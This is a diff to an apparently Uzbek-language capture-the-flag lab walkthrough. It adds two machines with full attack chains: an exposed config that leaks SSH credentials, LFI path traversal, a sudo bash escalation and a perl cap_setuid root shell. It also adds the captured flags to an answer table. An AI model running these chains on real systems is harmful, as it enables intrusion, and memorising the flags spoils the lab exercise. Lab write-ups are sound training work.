@@ -61,6 +61,34 @@ cat /root/root.txt
 
 ---
 
+## 1a) web-easy 🟢 (172.20.0.40) — ochiq config → SSH → sudo bash → root
+
+```bash
+dirb http://172.20.0.40 /root/dirs.txt         # -> /config.old
+curl http://172.20.0.40/config.old             # -> ssh_user=deploy  ssh_pass=D3ploy2024!
+sshpass -p 'D3ploy2024!' ssh deploy@172.20.0.40
+cat /home/deploy/user.txt                       # EJPT{3xp0s3d_c0nf1g_ssh}
+sudo -l                                         # (root) NOPASSWD: /bin/bash
+sudo /bin/bash
+cat /root/root.txt                              # EJPT{sud0_b4sh_3z_r00t}
+```
+
+## 1b) web-hard 🔴 (172.20.0.50) — LFI → SSH cred → SSH → perl cap_setuid → root
+
+```bash
+# view.php?page= — LFI / path traversal (docs/ dan ../ bilan chiqiladi)
+curl "http://172.20.0.50/view.php?page=../../../../etc/passwd"       # foydalanuvchilar
+curl "http://172.20.0.50/view.php?page=../../../../opt/monitor/deploy_notes.txt"
+#   -> user: webadmin   pass: W3bM0n1t0r2024!
+sshpass -p 'W3bM0n1t0r2024!' ssh webadmin@172.20.0.50
+cat /home/webadmin/user.txt                     # EJPT{lf1_l34ks_ssh_cr3ds}
+getcap -r / 2>/dev/null                          # /usr/bin/perl = cap_setuid+ep
+perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
+cat /root/root.txt                              # EJPT{c4p_s3tu1d_p3rl_r00t}
+```
+
+---
+
 ## 2) linux-02 (172.20.0.20) — FTP hint + SSH → SUID find → root
 
 **a) Anonim FTP:**
@@ -143,6 +171,10 @@ proxychains curl "http://10.10.10.20:8080/ping?host=127.0.0.1;cat /flag.txt"
 
 | # | Mashina | Flag |
 |---|---|---|
+| 0 | web-easy (user) | `EJPT{3xp0s3d_c0nf1g_ssh}` |
+| 0 | web-easy (root) | `EJPT{sud0_b4sh_3z_r00t}` |
+| 0 | web-hard (user) | `EJPT{lf1_l34ks_ssh_cr3ds}` |
+| 0 | web-hard (root) | `EJPT{c4p_s3tu1d_p3rl_r00t}` |
 | 1 | web-01 (user) | `EJPT{w3b_upl04d_rce_www_data}` |
 | 2 | web-01 (root) | `EJPT{w3b01_sud0_pyth0n_r00t}` |
 | 3 | linux-02 (user) | `EJPT{ftp_ssh_cr4ck_f00th0ld}` |
